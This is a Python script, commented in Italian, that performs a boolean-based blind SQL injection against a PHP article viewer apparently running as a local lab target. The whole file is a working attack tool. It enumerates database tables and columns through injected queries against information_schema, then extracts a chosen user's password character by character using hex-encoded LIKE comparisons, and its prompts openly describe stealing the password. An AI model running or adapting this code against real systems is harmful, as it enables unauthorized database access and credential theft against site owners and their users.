import requests
from bs4 import BeautifulSoup

url = 'http://localhost:8080/view_article.php?id='

def inject(payload, username=None): #username=None -> tables, altrimenti -> password
    result = ''
    if username == None:
        dictionary = '0123456789abcdefghijklmnopqrstuvwxyz _'
    else:
        dictionary = '0123456789abcdef'

    while True:
        for c in dictionary:
            #tables
            if username == None:
                question = url + payload.format(result + c)
            #password
            else:
                question = url + payload.format(username, result + c)
            #Manda la richiesta GET
            response = requests.get(question)

            # Verifica lo stato della risposta
            if response.status_code == 200:
                # Parsing dell'HTML con BeautifulSoup
                soup = BeautifulSoup(response.text, "html.parser")
    
                # Trova il primo elemento <h1> presente nella pagina
                paragraph = soup.find("h1")

                # Verifica se l'elemento <h1> è presente e non vuoto, se è cosi, allora è stata trovata una corrispondenza
                if paragraph.text and paragraph.text != "Articolo non trovato!":
                    response = True
                else:
                    response = False
            else:
                response = False

            if response:  # E' stata trovata una corrispondenza!
                result += c
                print(result)
                break
        else:
            return result

def get_tables():
    payload = "1' and (select 1 from information_schema.tables where table_schema = DATABASE() having GROUP_CONCAT(table_name separator ' ') LIKE '{}%')='1"
    print("Bruteforce delle tabelle in corso...")
    result = inject(payload)
    print("Le tabelle del database sono:\n" + result)
    tables = result.split(' ')
    #Crea un dizionario con le tabelle del database e le colonne di ogni tabella
    database = {}
    for table in tables:
        database[table] = []
        print("Bruteforce delle colonne della tabella " + table + " in corso...")
        payload = "1' and (select 1 from information_schema.columns where table_name = '" + table +  "' having GROUP_CONCAT(column_name separator ' ') LIKE '{}%')='1"
        result = inject(payload)
        print("Le colonne della tabella " + table + " sono:\n" + result)
        columns = result.split(' ')
        for column in columns:
            database[table].append(column)
    #Stampa lo schema completo del database
    print("Schema del database:")
    for table in database:
        print("-"*30)
        print("Tabella: " + table)
        for column in database[table]:
            print(" - " + column + "\n")
        print("-"*30)

def get_password():
    print("Username dell'utente a cui rubare la password: ")
    username = input()
    payload = "1' and (select 1 from users where username = '{}' and HEX(password) LIKE '{}%')='1"
    result = inject(payload, username)
    print("La password di " + username +  " è: " + bytes.fromhex(result).decode()) #stampa la password convertendola da esadecimale a stringa


#--------------------------------
#FUNZIONE MAIN
#--------------------------------

def main():
    #Chiede all'utente se vuole conoscere le tabelle e le colonne del database oppure se vuole conoscere la password di un utente
    print("Cosa vuoi fare?\n1. Conoscere le tabelle e le colonne del database.\n2. Conoscere la password di un utente?")
    scelta = input()
    #Se l'utente vuole conoscere le tabelle e le colonne del database
    if scelta == '1':
        get_tables()
    #Se l'utente vuole conoscere la password di un utente
    elif scelta == '2':
        get_password()
    else:
        print("Scelta non valida")
                 
if __name__ == "__main__":
    main()
